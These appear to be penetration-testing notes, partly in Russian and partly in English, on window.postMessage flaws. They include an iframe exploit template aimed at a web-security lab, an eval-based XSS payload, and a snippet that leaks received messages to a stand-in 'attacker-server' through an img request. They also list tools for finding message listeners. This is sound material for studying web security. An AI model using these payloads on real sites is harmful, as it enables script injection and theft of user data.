# window.postMessage

## Intro: что такое postMessage

Это метод `cross-origin` коммуникации между элементами `Window`: между страницей и всплывающим окном этой страницы, между страницей и `iframe`, встроенным в нее, и тп

Обычно, скрипты имеют доступ к друг другу на разных страницах если, и только если, имеют одинкавый протокол, хост и порт ([same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy)). `postMessage` дает безопасный способ обойти это ограничения (если правильно использовать).

В общем, одно окно может получить ссылку на другое (например, через `targetWindow = window.opener`), а затем отправить ему `MessageEvent` с помощью `targetWindow.postMessage()`. Получающее окно тогда свободно обрабатывать это событие по мере необходимости. Аргументы, передаваемые в `window.postMessage()` (то есть «сообщение»), открываются принимающему окну через объект события.

Общий exploit для страницы, на которой открыт web message communication

```markup
<html>
    <head>
        <title>DOM based vulns</title>
    </head>
    <body>
        <script>
            function callback() {
                document.getElementById('target_website').contentWindow.postMessage('my data to web message listener', '*');
            }
        </script>
        <iframe id="target_website" onload="callback()" src="https://0abf00eb04791b73c0d62af8001a00d0.web-security-academy.net/">
        </iframe>
    </body>
</html>
```

## К чему может привести неправильное использование

### XSS

Где-то обрабатывается message:

```javascript
function (b){b.data.evalCall&&eval("("+b.data.evalCall+")")}
```

Мы отправляем сообщение

```javascript
b.postMessage({"evalCall":"alert(document.domain)"},"*")
```

Это возможно, если секция вызова postMessage является уязвимой или настройка CORS на принимающей стороне является уязвимой.

### Leak Sensitive Data

vuln page

```javascript
function parent_getUserInfo()
{
   var userdata=[name,age, ...];
   parent.postMessage(userdata);
}
```

attacker

```markup
<img src="http://attacker-server/?" id=message> 
<script>
 window.onmessage = function(e){  
  document.getElementById("message").src += "&"+e.data;
 }
</script>
```

## Tools

Есть инструмент для мониторинга использования postMessages - [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)

Оформлена как Google extension (но и в ff стартует вроде тож)



To exploit the postMessage() vulnerabilities, first, it is required to know if the target application is using web messaging or not. If the target application uses web messaging, it is essential to identify the various listeners. There are several methods to do so, including:

1. **Searching for the keywords:** Use the developer tool’s global search option to search for specific keywords such as **postMessage(), addEventListener(“message, .on(“message”** in the javascript files.
2. **Using** [**MessPostage**](https://github.com/Sjord/messpostage) **Browser Extension:** Using this extension is an easy way to detect whenever an application usage postMessage() APIs. This also shows which messages were sent and where event listeners have been added:
3. **Using Developer Tools:** The “Global Listener” feature present in the “Sources” pane of Developer tools can be used to identify the use of postMessage(). After opening the Global Listener, click on “messages” to view the message handlers.
4. **Using** [**Posta**](https://github.com/benso-io/posta)**:** Posta is a tool for researching Cross-document Messaging communication. It allows you to track, explore and exploit `postMessage` vulnerabilities, and includes features such as replaying messages sent between windows within any attached browser.
5. **Using** [**PMHook**](https://github.com/yehgdotnet/postmessagehook)**:** PMHook is a client-side JavaScript library designed to be used with TamperMonkey in the Chrome web browser. Executed immediately at page load, PMHook wraps the **EventTarget.addEventListener** method and logs any subsequent message event handers as they are added. The event handler functions themselves are also wrapped to log messages received by each handler.

Если надо проверить быстренько, что post messages шлются на странице, можно в консоли вбить и ловить сообщения:

```
window.addEventListener('message', data => console.log(data))
```
